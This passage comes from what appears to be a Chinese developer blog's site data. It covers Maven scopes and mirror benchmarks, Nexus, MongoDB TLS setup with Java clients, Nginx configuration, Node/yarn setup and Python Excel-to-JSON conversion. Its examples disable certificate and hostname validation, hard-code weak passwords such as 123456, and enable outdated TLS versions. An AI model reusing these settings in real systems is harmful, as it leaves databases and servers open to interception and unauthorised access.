只能作用在编译和测试时，同时没有传递性。\n使用这个时，不会将包打入本项目中，只是依赖过来。（when building a web application for the Java Enterprise Edition, you would set the dependency on the Servlet API and related Java EE APIs to scope provided because the web container provides those classes. This scope is only available on the compilation and test classpath, and is not transitive.） \n runtime \n 表示dependency不作用在编译时，但会作用在运行和测试时 \n test \n 表示dependency作用在测试时，不作用在运行时。 \n system \n 跟provided 相似，但是在系统中要以外部JAR包的形式提供，maven不会在repository查找它。 例如： \n < dependencies > \n　　 < dependency > \n　　　 < groupId > javax.sql </ groupId > \n　　　 < artifactId > jdbc-stdext </ artifactId > \n　　　 < version > 2.0 </ version > \n　　　 < scope > system </ scope > \n　　　 < systemPath > ${java.home}/lib/rt.jar </ systemPath > \n　　 </ dependency > \n </ dependencies > \n \n 1 2 3 4 5 6 7 8 9 #  import (Maven 2.0.9 之后新增) \n 它只使用在 <dependencyManagement> 中，表示从其它的pom中导入dependency的配置，例如 (B项目导入A项目中的包配置)： \n"},{title:"Java开发者必备神器Maven国内镜像加速深度测试",frontmatter:{title:"Java开发者必备神器Maven国内镜像加速深度测试",date:"2021-10-09 23:57:58",tags:["Maven"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_setting_mirroring.html",relativePath:"blogs/maven/maven_setting_mirroring.md",key:"v-32cf99d6",path:"/blogs/maven/maven_setting_mirroring.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" Maven是当前流行的项目管理工具，但官方的库在国内经常连不上，连上以后龟一般的速度也能让你崩溃，这时候也许你会去搜索下如何加速。\n百度搜索 maven镜像 会发现绝大部分都在推荐 阿里云 的镜像服务，但是阿里云的镜像服务真的好用吗？去国内各大云厂商搜索了下发现都提供了镜像服务，到底哪个是最快的呢？这里进行深度测试。各大厂商也是鸡贼，对关键字也做了处理比如腾讯的 腾讯云镜像maven 腾讯云maven镜像 \n 镜像地址 \n \n 阿里云 https://maven.aliyun.com/mvn/view \n 腾讯云 https://mirrors.cloud.tencent.com/ \n 华为云 https://mirrors.huaweicloud.com/ \n \n 下载速度\n配置文件准备\n示例程序使用之前多数据源配置的程序样例，文末有下载方式 \n 我们使用华为云maven镜像加速下载下来的配置文件为模板，复制三份，mirror分别指定为华为云、阿里云、腾讯云的地址，文件命名为 settings_ali.xml settings_huawei.xml settings_tencent.xml \n maven本地缓存路径使用默认的地址 ${user.home}/.m2/repository ,每次构建之前需要清理本地缓存文件 \n rm  -rf /root/.m2/repository/*\n \n 1 我们使用maven命令行窗口指定特定settings.xml的方式进行测试\nmaven命令如下 \n mvn clean package -Dmaven.test.skip = true -s settings_ali.xml\n \n 1 完整的脚本\n这里以华为云为例，脚本执行100次 \n #!/bin/bash \n echo   ''   >  huawei\n for   (( i = 1 ;  i <= 100 ;  i  ++ )) \n do \n     echo   $i \n     rm  -rf /root/.m2/repository/*\nstart_mill=$((`date '+%s'`*1000+`date '+%N'`/1000000)) \n    mvn clean package -Dmaven.test.skip = true -s settings_huawei.xml  >>  huawei\nend_mill=$((`date '+%s'`*1000+`date '+%N'`/1000000)) \ndiff=$[10#$end_mill-10#$start_mill] \n     #echo $diff >> huawei \n done \n grep   'Total time'  huawei  | awk   'BEGIN {max = 0} {if ( $4 >max) max= $4  fi} END {print \"Max=\", max}' \n grep   'Total time'  huawei  | awk   'BEGIN {min = 6553565} {if ( $4 <min) min= $4  fi} END {print \"Min=\", min}' \n grep   'Total time'  huawei  | awk   '{sum+= $4 }END{print \"Average = \", sum/NR}' \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 使用到了awk进行统计 \n 结论\n用户体验： 华为云>腾讯云>阿里云\n下载速度： 华为云>阿里云>腾讯云 \n 用户体验无所谓了一次性配置，我们肯定首选下载速度最快的华为云了。 \n 小技巧：使用nohup让脚本后台运行，nohup sh mvn-tencent.sh & \n"},{title:"Nexus 下载自定义上传的jar",frontmatter:{title:"Nexus 下载自定义上传的jar",date:"2021-10-09 23:27:47",tags:["nexus"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/nexus_download_selfupload_jar.html",relativePath:"blogs/maven/nexus_download_selfupload_jar.md",key:"v-2bbf93d6",path:"/blogs/maven/nexus_download_selfupload_jar.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 最近在本地Nexus中添加了一个外部依赖包，通过Nexus后台可以查看，通过URL也可以访问，可是本地开发环境就是说找不到。 \n 错误如下： \n [ERROR] Failed to execute goal on project enterprise-server: Could not resolve dependencies for project com.thgy:enterprise-server:jar:1.0-SNAPSHOT: Failure to find net.ipmarker:IPMarker_DevAPI_JavaSDK:jar:2.0 in http://nexus.xxxx.xxx/repository/maven-public/ was cached in the local repository, resolution will not be reattempted until the update interval of nexus has elapsed or updates are forced -> [Help 1] \n 通过上面发现，问题在于，maven并没有从nexus上寻找新包，原因就是时间没有到（而包是我刚上传的）。 \n 后面发现maven有一个参数： \n -U,--update-snapshots                  Forces a check for missing releases and updated snapshots on\n \n 1 通过命令行： \n mvn -U compile\n \n 1 就可以把项目需要的包下载下来了。 \n 另外：\n通过管理后台上传时，注意勾选生产POM文件。 \n"},{title:"MongoDB配置SSL/TLS安全连接、java连接",frontmatter:{title:"MongoDB配置SSL/TLS安全连接、java连接",date:"2021-10-17 14:24:12",tags:["mongodb","ssl","tsl"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/mongo/mongo_ssl_tsl.html",relativePath:"blogs/mongo/mongo_ssl_tsl.md",key:"v-01b4ab15",path:"/blogs/mongo/mongo_ssl_tsl.html",headers:[{level:2,title:"生成ca.pem",slug:"生成ca-pem"},{level:2,title:"生成server.pem",slug:"生成server-pem"},{level:2,title:"修改配置文件",slug:"修改配置文件"},{level:2,title:"生成client.pem",slug:"生成client-pem"},{level:2,title:"生成trustStore 和 keyStore",slug:"生成truststore-和-keystore"},{level:3,title:"keytool 方式",slug:"keytool-方式"},{level:3,title:"openssl 方式",slug:"openssl-方式"},{level:2,title:"第一种ssl方法",slug:"第一种ssl方法"},{level:3,title:"添加依赖",slug:"添加依赖"},{level:3,title:"连接代码",slug:"连接代码"},{level:2,title:"第二种动态加载ssl",slug:"第二种动态加载ssl"},{level:3,title:"添加依赖",slug:"添加依赖-2"},{level:3,title:"连接代码",slug:"连接代码-2"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 服务器端证书配置 \n 服务器端需两个文件:  ca.pem 、 server.pem \n 生成ca.pem \n openssl req -out ca.pem -new -x509 -days  3650  -subj  "/C=CN/ST=BeiJing/O=bigdata/CN=root/emailAddress=yangxc@163.com" \n此处会要求配置ca.pem密码，后续将会用到 \n \n 1 2 \n 参数说明 \n -x509： 用于生成自签证书，如果不是自签证书则不需要此项 \n -days: 证书的有效期限，默认是365天 \n 生成server.pem \n生成服务器端私钥 \nopenssl genrsa -out server.key  2048  \n生成服务器端申请文件 \nopenssl req -key server.key -new -out server.req -subj  "/C=CN/ST=BeiJing/O=bigdata/CN=server1/CN=localhost/emailAddress=yangxc@163.com" \n生成服务器端证书 \nopenssl x509 -req -in server.req -CA ca.pem -CAkey privkey.pem -CAcreateserial -out server.crt -days  3650 \n合并服务器端私钥和服务器端证书，生成server.pem \n cat  server.key server.crt  >  server.pem\n校验服务器端pem文件 \nopenssl verify -CAfile ca.pem server.pem\nserver.pem: OK\n \n 1 2 3 4 5 6 7 8 9 10 11 #  服务器端配置 \n 修改配置文件 \n mongodb的ssl/tsl配置默认是关闭的，需更改配置文件进行开启 \n \n ssl \n \n vim  mongod.conf\n\nnet:\n port: 27017 \n bindIp: 127.0.0.1 \n  ssl:\n必须使用ssl连接 \n    mode: requireSSL\n必须使用绝对路径 \n    PEMKeyFile: /etc/server.pem\n必须使用绝对路径 \n    CAFile: /etc/ca.pem\n允许不可用主机名 \n    allowInvalidHostnames:  true \n允许使用自签证书,如果使用自签证书必须配置该项，否则会认证失败 \n    allowInvalidCertificates:  true \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \n tls \n \n vim  mongod.conf\n\nnet:\n port: 27017 \n bindIp: 127.0.0.1 \n  tls:\n必须使用ssl连接 \n    mode: requireTLS\n必须使用绝对路径 \n    certificateKeyFile: /etc/server.pem\n必须使用绝对路径 \n    CAFile: /etc/ca.pem\n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 #  启动MongoDB数据库 \n docker run --name mongo_test -d --restart always -p  27017 :27017 -e  MONGO_INITDB_ROOT_USERNAME = admin -e  MONGO_INITDB_ROOT_PASSWORD = 123456  -v /home/ubuntu/mongo/mongod.conf:/etc/mongod.conf -v /home/ubuntu/mongo/etc/ca.pem:/etc/ca.pem -v /home/ubuntu/mongo/etc/server.pem:/etc/server.pem mongo --auth --config /etc/mongod.conf\n \n 1 #  客户端证书配置 \n 生成client.pem \n生成客户端私钥 \nopenssl genrsa -out client.key  2048 \n生成客户端申请文件 \nopenssl req -key client.key -new -out client.req -subj  "/C=CN/ST=BeiJing/O=bigdata/CN=server1/CN=localhost/emailAddress=yangxc@163.com" \n生成客户端证书 \nopenssl x509 -req -in client.req -CA ca.pem -CAkey privkey.pem -CAserial ca.srl  -out client.crt -days  3650 \n合并客户端私钥和客户端证书，生成client.pem \n cat  client.key client.crt  >  client.pem\n校验客户端pem文件 \nopenssl verify -CAfile ca.pem client.pem\nclient.pem: OK\n \n 1 2 3 4 5 6 7 8 9 10 11 #  测试连接 \n 将 ca.pem 和 client.pem 拷贝到客户端主机，然后用navicat测试连接 \n java客户端ssl配置 \n 两种方法，一种是直接导入到jvm ,第二种是动态管理 \n 生成trustStore 和 keyStore \n keytool 方式 \n #根证书信息 trustStore \nkeytool -import -keystore cacerts -file ca.pem -storepass  123456 \n \n 1 2 \n 参数说明： \n -storepass: 密钥库密码 \n -keystore cacerts: cacertes为密钥库文件 \n \n #客户端 keyStore \nopenssl pkcs12 -export -out mongodb.pkcs12 -in client.pem\n \n 1 2 #  openssl 方式 \n #根证书信息 trustStore \nopenssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -name server.12\n \n 1 2 #客户端 keyStore \nopenssl pkcs12 -export -in client.pem  -out keystore\n \n 1 2 #  第一种ssl方法 \n 添加依赖 \n < dependency > \n    < groupId > org.mongodb </ groupId > \n    < artifactId > mongo-java-driver </ artifactId > \n    < version > 3.8.1 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  连接代码 \n package   com . example ; \n\n import   com . mongodb . MongoClient ; \n import   com . mongodb . MongoClientURI ; \n\n public   class   Mongo   { \n   public   static   void   main ( String [ ]  args )   { \n     // 配置信任库 \n     System . setProperty ( "javax.net.ssl.trustStore" ,   "cacerts" ) ; \n     System . setProperty ( "javax.net.ssl.trustStorePassword" ,   "123456" ) ; \n     // 配置信任证书 \n     System . setProperty ( "javax.net.ssl.keyStore" ,   "mongodb.pkcs12" ) ; \n     System . setProperty ( "javax.net.ssl.keyStorePassword" ,   "password" ) ; \n     // 连接mongo数据库 \n     MongoClientURI  uri  =   new   MongoClientURI ( "mongodb://admin:123456@localhost:27017/?ssl=true&authSource=admin" ) ; \n     MongoClient  client  =   new   MongoClient ( uri ) ; \n     // 获取mongo数据库中的库名 \n     System . out . println ( client . listDatabaseNames ( ) . first ( ) ) ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  第二种动态加载ssl \n \n 通过System setProperty设置程序运行时属性的方式，可能会增加程序的不安全性，特别是在使用第三方库的时候。自定义KeyManager TrustManager，生成定制SSLContext实例可以解决这个问题，而且不会污染系统属性。 \n 不需要添加服务端证书至JVM证书库，只需在程序中指定jdk支持格式的证书、client端keystore即可。 \n 添加依赖 \n      < dependency > \n       < groupId > org.mongodb </ groupId > \n       < artifactId > mongo-java-driver </ artifactId > \n       < version > 3.8.1 </ version > \n     </ dependency > \n     < dependency > \n       < groupId > org.springframework.data </ groupId > \n       < artifactId > spring-data-mongodb </ artifactId > \n       < version > 3.2.5 </ version > \n     </ dependency > \n     < dependency > \n       < groupId > org.apache.httpcomponents </ groupId > \n       < artifactId > httpcore </ artifactId > \n       < version > 4.4.9 </ version > \n     </ dependency > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #  连接代码 \n package   com . example ; \n\n import   java . io . FileInputStream ; \n import   java . security . KeyStore ; \n import   java . security . SecureRandom ; \n\n import   javax . net . SocketFactory ; \n import   javax . net . ssl . KeyManagerFactory ; \n import   javax . net . ssl . SSLContext ; \n import   javax . net . ssl . TrustManagerFactory ; \n\n import   com . mongodb . MongoClient ; \n import   com . mongodb . MongoClientOptions ; \n import   com . mongodb . MongoCredential ; \n import   com . mongodb . ServerAddress ; \n\n public   class   Mongo   { \n   public   static   void   main ( String [ ]  args )   {     \n     try   { \n\n       String  trustStore  =   "cacerts" ; \n       String  trustStorePassword  =   "123456" ; \n\n       String  keyStore  =   "mongodb.pkcs12" ; \n       String  keyStorePassword  =   "password" ; \n\n       // 添加SSL认证 \n       SocketFactory  socketFactory  =   createSocketFactory ( trustStore ,  trustStorePassword ,  keyStore ,  keyStorePassword ) ; \n       // 设置ssl配置 \n       MongoClientOptions  sslOptions  =   MongoClientOptions . builder ( ) . socketFactory ( socketFactory ) . sslEnabled ( true ) \n           . sslInvalidHostNameAllowed ( true ) . build ( ) ; \n\n       // init mongo \n       String  username  =   "admin" ; \n       String  password  =   "123456" ; \n       String  dbName  =   "admin" ; \n       String  ip  =   "127.0.0.1" ; \n       int  port  =   27017 ; \n       MongoCredential  credential  =   MongoCredential . createCredential ( username ,  dbName ,  password . toCharArray ( ) ) ; \n\n       MongoClient  client2  =   new   MongoClient ( new   ServerAddress ( ip ,  port ) ,  credential ,  sslOptions ) ; \n       System . out . println ( client2 . listDatabaseNames ( ) . first ( ) ) ; \n      client2 . close ( ) ; \n     }   catch   ( Exception  e )   { \n       // TODO Auto-generated catch block \n      e . printStackTrace ( ) ; \n     } \n\n   } \n\n   /**\n   * 创建一个SocketFactory.\n   *\n   * @param trustStorePath keyStore 真实路径\n   * @param trustStorePwd  keyStore 真实路径\n   * @param keyStorePath   keyStore 路径\n   * @param keyStorePwd    keyStore密码\n   * @return\n   * @throws Exception\n   */ \n   private   static   SocketFactory   createSocketFactory ( String  trustStorePath ,   String  trustStorePwd ,   String  keyStorePath , \n       String  keyStorePwd )   throws   Exception   { \n     SSLContext  sslContext  =   SSLContext . getInstance ( "SSL" ) ; \n     KeyStore  keyStore  =   KeyStore . getInstance ( KeyStore . getDefaultType ( ) ) ; \n     FileInputStream  myKeyStore  =   new   FileInputStream ( keyStorePath ) ; \n    keyStore . load ( myKeyStore ,  keyStorePwd . toCharArray ( ) ) ; \n    myKeyStore . close ( ) ; \n     // default SunX509 \n     KeyManagerFactory  kmf  =   KeyManagerFactory . getInstance ( KeyManagerFactory . getDefaultAlgorithm ( ) ) ; \n    kmf . init ( keyStore ,  keyStorePwd . toCharArray ( ) ) ; \n\n     // set up a TrustManager that trusts everything \n     // 1.trust specific sslCaKeystore \n     KeyStore  trustStore  =   KeyStore . getInstance ( KeyStore . getDefaultType ( ) ) ; \n     TrustManagerFactory  tmf  =   TrustManagerFactory . getInstance ( TrustManagerFactory . getDefaultAlgorithm ( ) ) ; \n     FileInputStream  myTrustStore  =   new   FileInputStream ( trustStorePath ) ; \n    trustStore . load ( myTrustStore ,  trustStorePwd . toCharArray ( ) ) ; \n    myTrustStore . close ( ) ; \n    tmf . init ( trustStore ) ; \n    sslContext . init ( kmf . getKeyManagers ( ) ,  tmf . getTrustManagers ( ) ,   new   SecureRandom ( ) ) ; \n     return  sslContext . getSocketFactory ( ) ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 '},{title:"Nginx 配置详解",frontmatter:{title:"Nginx 配置详解",date:"2021-11-11 16:48:03",tags:["nginx"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/nginx/nginx_setting.html",relativePath:"blogs/nginx/nginx_setting.md",key:"v-9b30c856",path:"/blogs/nginx/nginx_setting.html",headers:[{level:2,title:"侦听端口",slug:"侦听端口"},{level:2,title:"访问日志",slug:"访问日志"},{level:2,title:"域名",slug:"域名"},{level:2,title:"静态资产",slug:"静态资产"},{level:2,title:"重定向",slug:"重定向"},{level:2,title:"反向代理",slug:"反向代理"},{level:2,title:"负载均衡",slug:"负载均衡"},{level:2,title:"SSL 协议",slug:"ssl-协议"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Nginx 是一个高性能的 HTTP 和反向代理 web 服务器，同时也提供了 IMAP/POP3/SMTP 服务，其因丰富的功能集、稳定性、示例配置文件和低系统资源的消耗受到了开发者的欢迎。\n本文，我们总结了一些常用的 Nginx 配置代码 \n 侦听端口 \n server  { \nStandard HTTP Protocol \n  listen 80;\nStandard HTTPS Protocol \n  listen 443 ssl;\nFor http2 \n  listen 443 ssl http2;\nListen on 80 using IPv6 \n  listen  [ : : ] : 80;\nListen only on using IPv6 \n  listen  [ : : ] : 80 ipv6only=on;\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  访问日志 \n server  { \nRelative or full path to log file \n  access_log /path/to/file.log;\nTurn 'on' or 'off' \n  access_log on;\n } \n \n 1 2 3 4 5 6 #  域名 \n server  { \nListen to yourdomain.com \n  server_name yourdomain.com;\nListen to multiple domains server_name yourdomain.com www.yourdomain.com; \nListen to all domains \n  server_name  *.yourdomain.com; \nListen to all top-level domains \n  server_name yourdomain. *; \nListen to unspecified Hostnames (Listens to IP address itself) \n  server_name \"\";\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 #  静态资产 \n server  { \n  listen 80;\n  server_name yourdomain.com;\n  location /  { \n    root /path/to/website;\n   } \n } \n \n 1 2 3 4 5 6 7 #  重定向 \n server  { \n  listen 80;\n  server_name www.yourdomain.com;\n  return 301 http : //yourdomain.com$request_uri;\n } \nserver  { \n  listen 80;\n  server_name www.yourdomain.com;\n  location /redirect - url  { \n    return 301 http : //otherdomain.com;\n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  反向代理 \n server  { \n  listen 80;\n  server_name yourdomain.com;\n  location /  { \n    proxy_pass http : //0.0.0.0 : 3000;\nwhere 0.0.0.0:3000 is your application server (Ex: node.js) bound on 0.0.0.0 listening on port 3000 \n   } \n } \n \n 1 2 3 4 5 6 7 8 #  负载均衡 \n upstream node_js  { \n  server 0.0.0.0 : 3000;\n  server 0.0.0.0 : 4000;\n  server 123.131.121.122;\n } \nserver  { \n  listen 80;\n  server_name yourdomain.com;\n  location /  { \n    proxy_pass http : //node_js;\n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  SSL 协议 \n server  { \n  listen 443 ssl;\n  server_name yourdomain.com;\n  ssl on;\n  ssl_certificate /path/to/cert.pem;\n  ssl_certificate_key /path/to/privatekey.pem;\n  ssl_stapling on;\n  ssl_stapling_verify on;\n  ssl_trusted_certificate /path/to/fullchain.pem;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_session_timeout 1h;\n  ssl_session_cache shared : SSL : 50m;\n  add_header Strict - Transport - Security max - age=15768000;\n } \nPermanent Redirect for HTTP to HTTPS \nserver\n { \n  listen 80;\n  server_name yourdomain.com;\n  return 301 https : //$host$request_uri;\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 其实可以采用可视化的方式对 Nginx 进行配置，我在 GitHub 上发现了一款可以一键生成 Nginx 配置的神器，相当给力。\n先来看看它都支持什么功能的配置：反向代理、HTTPS、HTTP/2、IPv6, 缓存、WordPress、CDN、Node.js 支持、 Python (Django) 服务器等等。\n nginx 在线配置 \n"},{title:"node安装后的设置(nodeglobal和nodecache) - windows",frontmatter:{title:"node安装后的设置(node_global和node_cache) - windows",date:"2021-05-23T15:31:26.000Z",tags:["node","install"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/nodejs/node_npm_yarn_config.html",relativePath:"blogs/nodejs/node_npm_yarn_config.md",key:"v-746cdd95",path:"/blogs/nodejs/node_npm_yarn_config.html",headers:[{level:2,title:"npm",slug:"npm"},{level:2,title:"yarn 2.0 以上",slug:"yarn-2-0-以上"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' npm \n 使用npm安装模块分为本地安装和全局安装。 \n 本地安装：npm install express    会安装到当前项目 \n 全局安装：npm install express -g  会安装到指定的目录(node_global) \n 另外，如果没有设置全局目录node_global，那么全局安装的文件将会保存到 C:\\Users\\hades\\AppData\\Roaming\\npm (hases是自己设置的计算机名字) \n 安装好node后，要设置一下node_global和node_cache(node缓存文件夹) \n \n \n 在node安装目录创建node_global和node_cache文件夹 \n \n \n 设置环境变量： \n \n \n 用户变量设置：将用户变量中 PATH 的值改成 D:\\Program Files\\nodejs\\node_global，没有PATH，可以直接添加。 \n 系统变量设置：添加变量 NODE_PATH  值为：D:\\Program Files\\nodejs\\node_modules \n \n 打开cmd，执行 \n \n npm  config  set  prefix  "D:\\Program Files \\n odejs \\n ode_global"    \n\n npm  config  set  cache  "D:\\Program Files \\n odejs \\n ode_cache" \n \n 1 2 3 \n 有时候用npm拉取包可能会很慢，可以用淘宝npm镜像代替npm进行拉包，就像github和gitee \n \n 执行： \n npm   install  -g cnpm --registry = https://registry.npm.taobao.org\n \n 1 #  yarn 2.0 以上 \n安装2.x版本 \n npm  i -g corepack\n yarn  init -2\n查看版本号 \n yarn  --version\n升级2.x版本，只能针对单个项目操作，且必须使用系统代理 \n yarn  policies set-version berry\nyarn升级到最新发布版本 \n yarn   set  version stable\n本机设置 \n\n cat  ~/.yarnrc.yml\n yarn  config  set  prefix  "D: \\r epositories\\yarn-repository\\Data" \n yarn  config  set  globalFolder  "D: \\r epositories\\yarn-repository\\Data\\global" \n yarn  config  set  cacheFolder  "D: \\r epositories\\yarn-repository\\Cache" \n yarn  config  set  link-folder  "D: \\r epositories\\yarn-repository\\Data\\link" \n yarn  config  set  pnpUnpluggedFolder  "D: \\r epositories\\yarn-repository\\.yarn\\unplugged" \n yarn  config  set  yarnPath  "D: \\r epositories\\yarn-repository\\.yarn \\r eleases\\yarn-3.2.0-rc.10.cjs" \n yarn  config  set  installStatePath  "D: \\r epositories\\yarn-repository\\.yarn\\install-state.gz" \n yarn  config  set  npmRegistryServer  "http://127.0.0.1:8081/repository/npm_huawei" \n yarn  config  set  unsafeHttpWhitelist --json  \'["127.0.0.1"]\' \nnodeLinker 默认值是 pnp, yarn install后不生成node_modules目录，项目运行有些依赖会报错，建议直接改 node-modules \n yarn  config  set  nodeLinker node_modules\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 '},{title:"将所有 Node.js 依赖包更新到最新版本",frontmatter:{title:"将所有 Node.js 依赖包更新到最新版本",date:"2022-02-19T18:29:48.000Z",tags:["nodejs"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/nodejs/nodejs-update-all-the-dependencies-to-their-latest-version.html",relativePath:"blogs/nodejs/nodejs-update-all-the-dependencies-to-their-latest-version.md",key:"v-f5496396",path:"/blogs/nodejs/nodejs-update-all-the-dependencies-to-their-latest-version.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 当使用  npm install <packagename>  安装软件包时，该软件包最新的可用版本会被下载并放入 node_modules 文件夹中，并且还会将相应的条目添加到当前文件夹中存在的 package.json 和 package-lock.json 文件中。 \n npm 会核计依赖，并安装这些依赖最新的可用版本。 \n 假设要安装 cowsay\n当  npm install cowsay  时，此条目会被添加到 package.json 文件中： \n { \n   "dependencies" :   { \n     "cowsay" :   "^1.3.1" \n   } \n } \n \n 1 2 3 4 5 以下是 package-lock.json 的片段，为方便查看，在其中删除了嵌套的依赖： \n { \n   "requires" :   true , \n   "lockfileVersion" :   1 , \n   "dependencies" :   { \n     "cowsay" :   { \n       "version" :   "1.3.1" , \n       "resolved" :   "https://registry.npmjs.org/cowsay/-/cowsay-1.3.1.tgz" , \n       "integrity" :   "sha512-3PVFe6FePVtPj1HTeLin9v8WyLl+VmM1l1H/5P+BTTDkMAjufp+0F9eLjzRnOHzVAYeIYFF5po5NjRrgefnRMQ==" , \n       "requires" :   { \n         "get-stdin" :   "^5.0.1" , \n         "optimist" :   "~0.6.1" , \n         "string-width" :   "~2.1.1" , \n         "strip-eof" :   "^1.0.0" \n       } \n     } \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 现在，这两个文件告诉我们，已安装了 cowsay 的 1.3.1 版本，并且更新的规则是 ^1.3.1（这对于 npm 版本控制规则意味着 npm 可以更新到补丁版本和次版本：即 1.3.2、1.4.0、依此类推）。 \n 如果有新的次版本或补丁版本，并且输入了  npm update ，则已安装的版本会被更新，并且 package-lock.json 文件会被新版本填充。 \n package.json  则保持不变。 \n 若要发觉软件包的新版本，则运行  npm outdated 。 \n 这些更新中有些是主版本。 运行 npm update 不会更新那些版本。 主版本永远不会被这种方式更新，因为它们（根据定义）会引入重大的更改，npm 希望为你减少麻烦。 \n 若要将所有软件包更新到新的主版本，则全局地安装 npm-check-updates 软件包： \n npm   install  -g npm-check-updates\n \n 1 然后运行： \n ncu -u\n \n 1 这会升级 package.json 文件的 dependencies 和 devDependencies 中的所有版本，以便 npm 可以安装新的主版本。 \n 现在可以运行更新了： \n npm  update\n \n 1 如果只是下载了项目还没有安装 node_modules 依赖包，并且想先安装新的版本，则运行： \n npm   install \n \n 1 '},{title:"node.js 写文件",frontmatter:{title:"node.js 写文件",date:"2021-05-10T17:43:49.000Z",tags:["nodejs"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/nodejs/nodejs-xie-wen-jian.html",relativePath:"blogs/nodejs/nodejs-xie-wen-jian.md",key:"v-54fcb436",path:"/blogs/nodejs/nodejs-xie-wen-jian.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" const  fs  =   require ( 'fs' ) \n  let  finalProvince  =   '2222' \nfs . writeFile ( 'temp.js' ,   JSON . stringify ( finalProvince ) ,   ( err )   =>   { \n   if   ( err )   throw  err ; \n  console . log ( 'The file has been saved!' ) ; \n } ) \n \n 1 2 3 4 5 6 "},{title:"Python Excel to JSON Conversion",frontmatter:{title:"Python Excel to JSON Conversion",date:"2022-02-17T19:38:30.000Z",tags:["python","JSON"],categories:"python",published:!0,hideInList:!0,feature:null,isTop:!1},regularPath:"/blogs/python/python-excel-to-json-conversion.html",relativePath:"blogs/python/python-excel-to-json-conversion.md",key:"v-3f06da6a",path:"/blogs/python/python-excel-to-json-conversion.html",headers:[{level:2,title:"Converting Excel Sheet to JSON String using Pandas Module",slug:"converting-excel-sheet-to-json-string-using-pandas-module"},{level:2,title:"Converting Excel File to JSON Files using excel2json-3 Module",slug:"converting-excel-file-to-json-files-using-excel2json-3-module"},{level:2,title:"Limitations of excel2json-3 module",slug:"limitations-of-excel2json-3-module"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' There are many ways to convert an excel file to JSON data. In this tutorial, we will look into two python modules to convert excel files to JSON. \n \n Pandas \n excel2json-3 (Not suggested) \n Converting Excel Sheet to JSON String using Pandas Module \n Pandas module provides functions to read excel sheets into DataFrame object. There are many options to specify headers, read specific columns, skip rows, etc. You can read more about it at  Pandas read_excel() – Reading Excel File in Python . \n We can use the to_json() function to convert the DataFrame object to JSON string. Let’s look at a simple example to read the “Employees” sheet and convert it to JSON string. \n \n import  pandas\n\nexcel_data_df  =  pandas . read_excel ( \'records.xlsx\' ,  sheet_name = \'Employees\' ) \njson_str  =  excel_data_df . to_json ( ) \n print ( \'Excel Sheet to JSON:\\n\' ,  json_str ) \n \n 1 2 3 4 5 6 Output: \n Excel Sheet to JSON:\n {"EmpID":{"0":1,"1":2,"2":3},"EmpName":{"0":"Pankaj","1":"David Lee","2":"Lisa Ray"},"EmpRole":{"0":"CEO","1":"Editor","2":"Author"}}\n \n 1 2 So, the JSON data is created with the orientation of columns. If you want to create the JSON string with row-wise orientation, pass the “orient” parameter value as “records”. \n json_str  =  excel_data_df . to_json ( orient = \'records\' ) \n \n 1 Output: \n \nExcel Sheet to JSON:\n [{"EmpID":1,"EmpName":"Pankaj","EmpRole":"CEO"},{"EmpID":2,"EmpName":"David Lee","EmpRole":"Editor"},{"EmpID":3,"EmpName":"Lisa Ray","EmpRole":"Author"}]\n \n 1 2 3 #  Converting Excel File to JSON Files using excel2json-3 Module \n It’s a very simple module to convert excel files to JSON files. The contents from the excel sheet are converted to JSON string and saved in a file. \n The name of the files is derived from the excel sheet names. So, if there are two sheets with the name “Numbers” and “Cars”, the JSON files will be named as Numbers.json and Cars.json respectively. \n The module supports both .xls and .xlsx file formats for conversion. We can read the excel file from the file system as well as the URL. \n We can install this module using the PIP command. \n pip  install  excel2json-3\n \n 1 For our example, I have created an excel file named “records.xlsx” having three sheets. \n \n Here is the script to convert this excel file to JSON files. \n import  excel2json\nexcel2json . convert_from_file ( \'records.xlsx\' ) \n \n 1 2 The script creates three JSON files. \n Employees.json \n \n [ \n     { \n         "EmpID" :   1.0 , \n         "EmpName" :   "Pankaj" , \n         "EmpRole" :   "CEO" \n     } , \n     { \n         "EmpID" :   2.0 , \n         "EmpName" :   "David Lee" , \n         "EmpRole" :   "Editor" \n     } , \n     { \n         "EmpID" :   3.0 , \n         "EmpName" :   "Lisa Ray" , \n         